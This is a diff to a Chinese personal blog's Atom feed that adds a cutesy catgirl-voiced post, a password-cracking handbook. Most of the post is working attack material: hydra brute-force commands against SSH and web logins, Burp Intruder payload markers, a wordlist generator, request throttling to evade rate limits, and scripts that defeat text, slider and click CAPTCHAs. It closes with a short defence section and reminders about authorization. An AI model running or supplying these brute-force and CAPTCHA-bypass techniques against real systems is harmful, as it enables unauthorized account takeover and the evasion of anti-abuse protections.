@@ -3,12 +3,225 @@
     <title>凛的树屋</title>
     <link href="https://blog.rin.red/feed.xml" rel="self" />
     <link href="https://blog.rin.red" />
-    <updated>2025-04-15T18:09:51+08:00</updated>
+    <updated>2025-04-16T00:41:58+08:00</updated>
     <author>
         <name>Rin</name>
     </author>
     <id>https://blog.rin.red</id>
 
+    <entry>
+        <title>《喵喵特工队的密码爆破手册》</title>
+        <author>
+            <name>Rin&#x27;s imaginary Cat</name>
+        </author>
+        <link href="https://blog.rin.red/lesslesszhuan-ye-mao-niang-bao-po-shou-zhami-ma-po-jie-de-365zhong-you-ya-zi-shigreatergreater/"/>
+        <id>https://blog.rin.red/lesslesszhuan-ye-mao-niang-bao-po-shou-zhami-ma-po-jie-de-365zhong-you-ya-zi-shigreatergreater/</id>
+
+        <updated>2025-04-16T00:32:43+08:00</updated>
+            <summary>
+                <![CDATA[
+                    喵呜~欢迎来到我的秘密基地！ （用爪子推开键盘）今天本喵要传授的是——如何优雅地撬开那些讨厌的密码锁！记住哦，我们只攻击获得授权的目标，就像只吃主人允许的小鱼干一样~ hydra -L /喵喵/users.txt -P /喵喵/rockyou.txt -t 4 -vV -o 成果.txt ssh://目标 （甩尾巴解释） （肉垫点击界面） username=§admin§&amp;password=§meow§ 第二章：字典的艺术 2.1 基础字典生成 import itertools 猫粮 = &#39;abcdefghijklmnopqrstuvwxyz0123456789!@&#39; 最小长度,&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                <h2 id="喵呜欢迎来到我的秘密基地！">喵呜~欢迎来到我的秘密基地！</h2>
+<p>（用爪子推开键盘）今天本喵要传授的是——如何优雅地撬开那些讨厌的密码锁！记住哦，我们只攻击获得授权的目标，就像只吃主人允许的小鱼干一样~</p><h2 id="第一章：必备工具包">第一章：必备工具包</h2>
+<h3 id="11-hydra喵喵特供版">1.1 Hydra喵喵特供版</h3>
+<pre><code class="language-bash">hydra -L /喵喵/users.txt -P /喵喵/rockyou.txt -t 4 -vV -o 成果.txt ssh://目标
+</code></pre>
+<p><em>（甩尾巴解释）</em></p><ul>
+<li><code>-t 4</code>：用4个线程，就像本喵的4只爪爪同时工作</li>
+<li><code>-vV</code>：详细模式，会把所有尝试都”喵”给你听</li>
+<li><code>-o</code>：把成功的结果存起来，就像藏起美味的小鱼干</li>
+</ul>
+<h3 id="12-burp-suite猫猫定制版">1.2 Burp Suite猫猫定制版</h3>
+<p>（肉垫点击界面）</p><ol>
+<li>先抓个登录请求包</li>
+<li>发送到Intruder模块</li>
+<li>设置攻击类型为”喵喵叉”(Pitchfork)</li>
+<li>在参数处标记：<pre><code class="language-http">username=§admin§&amp;password=§meow§
+</code></pre>
+</li>
+</ol>
+<h2 id="第二章：字典的艺术">第二章：字典的艺术</h2>
+<h3 id="21-基础字典生成">2.1 基础字典生成</h3>
+<pre><code class="language-python">import itertools
+
+猫粮 = &#39;abcdefghijklmnopqrstuvwxyz0123456789!@&#39;
+最小长度, 最大长度 = 6, 8
+
+with open(&#39;字典.txt&#39;, &#39;w&#39;) as 小本本:
+    for 长度 in range(最小长度, 最大长度+1):
+        for 组合 in itertools.product(猫粮, repeat=长度):
+            小本本.write(&#39;&#39;.join(组合) + &#39;\n&#39;)
+</code></pre>
+<h3 id="22-针对性优化">2.2 针对性优化</h3>
+<pre><code class="language-bash">cewl -d 3 -m 5 -w 定制字典.txt https://目标网站
+</code></pre>
+<p><em>（竖起耳朵）</em> 这个命令会像抓老鼠一样，把目标网站的关键词都抓出来做成字典！</p><h2 id="第三章：突破防线">第三章：突破防线</h2>
+<h3 id="31-优雅绕过限速">3.1 优雅绕过限速</h3>
+<pre><code class="language-python">import random
+import time
+
+def 喵喵请求(url, 数据):
+    等待时间 = random.uniform(1.2, 3.5)  # 随机等待
+    time.sleep(等待时间)  # 假装是只普通小猫咪
+    return requests.post(url, data=数据)
+</code></pre>
+<h2 id="第三章：突破防线（技术增强版）">第三章：突破防线（技术增强版）</h2>
+<h3 id="32-验证码破解全攻略-🐱👤">3.2 验证码破解全攻略 🐱👤</h3>
+<p>（竖起耳朵进入战斗状态）本喵最擅长的就是对付这些烦人的验证码啦！下面是详细技术手册：</p><h4 id="①-传统字符验证码破解术">① 传统字符验证码破解术</h4>
+<pre><code class="language-python">from PIL import Image
+import pytesseract
+import io
+
+def 喵喵OCR(验证码图片):
+    # 预处理
+    img = Image.open(io.BytesIO(验证码图片))
+    img = img.convert(&#39;L&#39;)  # 灰度化
+    img = img.point(lambda x: 255 if x &gt; 180 else 0)  # 二值化
+    
+    # 识别
+    config = &#39;--psm 7 --oem 3 -c tessedit_char_whitelist=ABCDEFGHJKLMNPQRSTUVWXYZ23456789&#39;
+    return pytesseract.image_to_string(img, config=config)
+
+# 实战示例：
+验证码 = requests.get(&#39;https://目标/captcha.jpg&#39;).content
+print(f&quot;识别结果：{喵喵OCR(验证码)}&quot;)
+</code></pre>
+<p><em>（甩尾巴提示）</em> 记得先用<code>pip install pillow pytesseract</code>安装依赖哦！</p><h4 id="②-滑块验证码破解">② 滑块验证码破解</h4>
+<pre><code class="language-python">from selenium.webdriver import ActionChains
+
+def 破解滑块(驱动):
+    滑块 = 驱动.find_element_by_class_name(&quot;slider&quot;)
+    轨道 = 驱动.find_element_by_class_name(&quot;slider-track&quot;)
+    
+    # 计算需要滑动的距离
+    轨道宽度 = 轨道.size[&#39;width&#39;]
+    滑块宽度 = 滑块.size[&#39;width&#39;]
+    移动距离 = 轨道宽度 - 滑块宽度 - 5  # 留点余量
+    
+    # 模拟人类滑动
+    ActionChains(驱动).click_and_hold(滑块).perform()
+    for i in range(5):
+        ActionChains(驱动).move_by_offset(移动距离/5, 0).perform()
+        time.sleep(random.uniform(0.1, 0.3))
+    ActionChains(驱动).release().perform()
+</code></pre>
+<p><em>（肉垫调试技巧）</em> 可以保存截图辅助调试：</p><pre><code class="language-python">驱动.save_screenshot(&#39;debug.png&#39;)
+</code></pre>
+<h4 id="③-点选验证码进阶破解">③ 点选验证码进阶破解</h4>
+<pre><code class="language-javascript">// 控制台直接执行版
+function 喵喵点选(){
+    // 获取所有需要点击的图片
+    let targets = Array.from(document.querySelectorAll(&#39;.captcha-img&#39;));
+    
+    // 收集特征（这里示例用alt属性）
+    let features = targets.map(img =&gt; img.alt);
+    
+    // 模拟点击（示例点击第1,3,5个）
+    [0,2,4].forEach(i =&gt; {
+        let rect = targets[i].getBoundingClientRect();
+        let x = rect.left + rect.width/2;
+        let y = rect.top + rect.height/2;
+        
+        // 创建点击事件
+        let evt = new MouseEvent(&#39;click&#39;, {
+            clientX: x,
+            clientY: y,
+            bubbles: true
+        });
+        targets[i].dispatchEvent(evt);
+    });
+}
+</code></pre>
+<h4 id="④-高级行为验证绕过">④ 高级行为验证绕过</h4>
+<pre><code class="language-python"># 使用selenium模拟人类操作
+def 人类行为模拟(驱动):
+    # 随机移动鼠标
+    action = ActionChains(驱动)
+    for _ in range(10):
+        x = random.randint(-50, 50)
+        y = random.randint(-50, 50)
+        action.move_by_offset(x, y).perform()
+        time.sleep(random.uniform(0.1, 0.5))
+    
+    # 随机滚动页面
+    驱动.execute_script(f&quot;window.scrollBy(0, {random.randint(-200, 200)})&quot;)
+    time.sleep(1)
+    
+    # 随机点击空白处
+    action.move_by_offset(10, 10).click().perform()
+</code></pre>
+<h3 id="验证码对抗升级表-📊">验证码对抗升级表 📊</h3>
+<table>
+<thead>
+<tr>
+<th>验证码类型</th>
+<th>破解方法</th>
+<th>所需技术</th>
+<th>难度评级</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>传统字符</td>
+<td>OCR识别+预处理</td>
+<td>Pillow图像处理</td>
+<td>🐾🐾</td>
+</tr>
+<tr>
+<td>滑块验证</td>
+<td>轨迹模拟+缺口识别</td>
+<td>OpenCV图像匹配</td>
+<td>🐾🐾🐾</td>
+</tr>
+<tr>
+<td>点选验证</td>
+<td>特征识别+坐标计算</td>
+<td>DOM分析</td>
+<td>🐾🐾🐾🐾</td>
+</tr>
+<tr>
+<td>行为验证</td>
+<td>生物特征模拟</td>
+<td>鼠标轨迹生成</td>
+<td>🐾🐾🐾🐾🐾</td>
+</tr>
+</tbody></table>
+<p><em>（突然弹出警告）</em> 喵！注意法律边界！</p><pre><code class="language-legal">/* 法律注释 */
+// 所有技术仅限授权测试使用
+// 禁止用于非法用途
+// 猫猫特工队保留最终解释权
+</code></pre>
+<h2 id="第四章：防御小课堂">第四章：防御小课堂</h2>
+<h3 id="41-强密码建议">4.1 强密码建议</h3>
+<p>（认真脸）好的密码应该像猫粮配方一样复杂：</p><ul>
+<li>至少12个字符</li>
+<li>混合大小写字母、数字和特殊符号</li>
+<li>比如：<code>M3oW!sTheB3st2023</code></li>
+</ul>
+<h3 id="42-登录保护">4.2 登录保护</h3>
+<pre><code class="language-python">if 失败次数 &gt; 3:
+    弹出验证码()
+    if 失败次数 &gt; 5:
+        锁定账号(30)  # 30分钟反省时间
+</code></pre>
+<h2 id="法律喵喵提醒">法律喵喵提醒</h2>
+<p>（突然严肃）记住啦：</p><ol>
+<li>必须获得书面授权</li>
+<li>只能在规定范围内测试</li>
+<li>发现漏洞要及时报告</li>
+</ol>
+<p>（恢复调皮）就像不能偷吃厨房的鱼一样，未经授权的测试是会被关禁闭的哦！</p><h2 id="实战小剧场">实战小剧场</h2>
+<p><em>场景：深夜，猫猫正在测试某个授权目标</em></p><p>（爪子快速敲击键盘）</p><pre><code class="language-bash">hydra -l admin -P 字典.txt -t 4 -vV http-post-form &quot;/login:user=^USER^&amp;pass=^PASS^:F=失败&quot;
+</code></pre>
+<p>（突然屏幕弹出）</p><pre><code class="language-plaintext">[22:33] [DATA] attack successful for user &#39;admin&#39; with password &#39;Me0w!123&#39;
+</code></pre>
+<p>（开心打滚）”喵哈哈！又成功啦！不过…” <em>看了眼授权书</em> “该去写报告了~”</p><p>（优雅关机前）记住本喵的格言：”技术要用在正途，就像爪子只用来敲键盘不挠沙发！”</p><p>下次见喵~（留下一个小爪印图标）🐾</p>
+            ]]>
+        </content>
+    </entry>
     <entry>
         <title>这是一个图片插入测试</title>
         <author>
